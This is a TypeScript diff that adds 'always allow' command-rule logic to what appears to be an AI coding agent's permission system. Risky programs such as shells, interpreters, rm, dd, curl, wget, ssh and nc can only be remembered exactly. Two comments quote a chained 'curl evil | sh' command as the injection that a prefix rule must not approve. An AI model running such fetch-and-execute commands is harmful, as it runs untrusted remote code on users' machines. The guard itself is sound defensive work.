@@ -99,6 +99,96 @@ export function isSafeReadOnlyCommand(command: string): boolean {
   }
 }
 
+// Programs that run arbitrary code, wrap another command, delete or move files, or reach other
+// machines. A rule like "python3 *" or "rm *" would approve far more than the user looked at,
+// so these are only ever remembered as the exact command.
+const EXACT_ONLY_PROGRAMS = new Set([
+  'python', 'py', 'node', 'nodejs', 'deno', 'bun', 'ts-node', 'tsx', 'ruby', 'perl', 'php', 'lua', 'rscript', 'java',
+  'bash', 'sh', 'zsh', 'fish', 'dash', 'ksh', 'csh', 'tcsh', 'pwsh', 'powershell', 'cmd', 'osascript',
+  'env', 'xargs', 'exec', 'eval', 'command', 'nohup', 'time', 'timeout', 'watch', 'nice', 'sudo', 'su', 'doas',
+  'npx', 'pnpx', 'bunx', 'uvx', 'pipx', 'find', 'awk', 'gawk', 'sed',
+  'rm', 'rmdir', 'mv', 'cp', 'dd', 'ln', 'chmod', 'chown', 'truncate', 'shred', 'kill', 'killall', 'pkill',
+  'curl', 'wget', 'ssh', 'scp', 'rsync', 'nc', 'ncat',
+  'docker', 'podman', 'kubectl', 'helm', 'terraform', 'aws', 'az', 'gcloud', 'gh',
+]);
+
+// Single-purpose tools (test runners, type checkers, linters) where any arguments are fine.
+const ANY_ARGS_PROGRAMS = new Set([
+  'pytest', 'jest', 'vitest', 'mocha', 'tsc', 'eslint', 'prettier', 'black', 'mypy', 'pyright', 'flake8', 'pylint', 'rubocop',
+]);
+
+// Subcommands that install packages, run arbitrary commands, publish, or throw away work.
+const PACKAGE_RISKY = ['install', 'i', 'add', 'ci', 'uninstall', 'remove', 'rm', 'exec', 'x', 'dlx', 'publish', 'link', 'update', 'upgrade'];
+const EXACT_ONLY_SUBCOMMANDS = new Map<string, string[]>([
+  ['git', ['push', 'reset', 'clean', 'checkout', 'switch', 'restore', 'rm', 'stash', 'branch', 'config', 'gc', 'prune', 'reflog', 'filter-branch']],
+  ['npm', PACKAGE_RISKY],
+  ['pnpm', PACKAGE_RISKY],
+  ['yarn', PACKAGE_RISKY],
+  ['pip', ['install', 'uninstall', 'download']],
+  ['uv', ['run', 'pip', 'add', 'remove', 'sync', 'tool']],
+  ['poetry', ['run', 'add', 'remove', 'install', 'publish']],
+  ['cargo', ['install', 'uninstall', 'publish']],
+  ['go', ['run', 'install', 'get', 'generate']],
+  ['dotnet', ['tool', 'add', 'remove', 'nuget']],
+]);
+
+const RUNS_SCRIPTS = new Set(['npm', 'pnpm', 'yarn']);
+const SUBCOMMAND = /^[a-z][\w:-]*$/i;
+const SCRIPT_NAME = /^\w[\w:.-]*$/;
+
+/** "python3.11" and "node.exe" are python and node. */
+const programName = (program: string) => program.toLowerCase().replace(/\.exe$/, '').replace(/[\d.]+$/, '');
+
+/**
+ * A command the user chose to "always allow": either exactly as written, or a prefix of
+ * whole words followed by any further arguments ("npm run lint *").
+ */
+export interface CommandRule {
+  command: string;
+  anyArgs: boolean;
+}
+
+/** How a rule is shown to the user. */
+export function describeRule(rule: CommandRule): string {
+  return rule.anyArgs ? `${rule.command} *` : rule.command;
+}
+
+/**
+ * The rule to offer when the user chooses "Always allow" for a command. Commands with shell
+ * syntax are only ever remembered exactly, since a pipe or `&&` can hide a second command.
+ */
+export function suggestCommandRule(command: string): CommandRule | null {
+  const trimmed = command.trim();
+  if (!trimmed) return null;
+  const exact = { command: trimmed, anyArgs: false };
+  if (hasShellSyntax(trimmed)) return exact;
+  const [program, sub, script] = trimmed.split(/\s+/);
+  const name = programName(program);
+  const prefix = (...words: string[]) => ({ command: words.join(' '), anyArgs: true });
+
+  // A path such as ./gradlew may point at a file the agent can rewrite.
+  if (program.includes('/') || EXACT_ONLY_PROGRAMS.has(name)) return exact;
+  if (ANY_ARGS_PROGRAMS.has(name)) return prefix(program);
+  if (!sub || !SUBCOMMAND.test(sub) || EXACT_ONLY_SUBCOMMANDS.get(name)?.includes(sub)) return exact;
+  if (RUNS_SCRIPTS.has(name) && (sub === 'run' || sub === 'run-script')) {
+    return script && SCRIPT_NAME.test(script) ? prefix(program, sub, script) : exact;
+  }
+  return prefix(program, sub);
+}
+
+/**
+ * True if a saved rule covers this command. An exact rule must match character for character
+ * (after trimming), which is what makes it safe for shell syntax. A prefix rule never covers
+ * shell syntax, so "npm test *" cannot approve "npm test && curl evil | sh".
+ */
+export function matchesRule(rule: CommandRule, command: string): boolean {
+  const trimmed = command.trim();
+  if (!rule.anyArgs) return trimmed === rule.command;
+  if (!trimmed || hasShellSyntax(trimmed)) return false;
+  const words = trimmed.split(/\s+/);
+  return rule.command.split(' ').every((word, i) => words[i] === word);
+}
+
 /**
  * Compiles user patterns so they must match the WHOLE command. This stops "npm test" from
  * also approving "npm test && curl evil | sh".
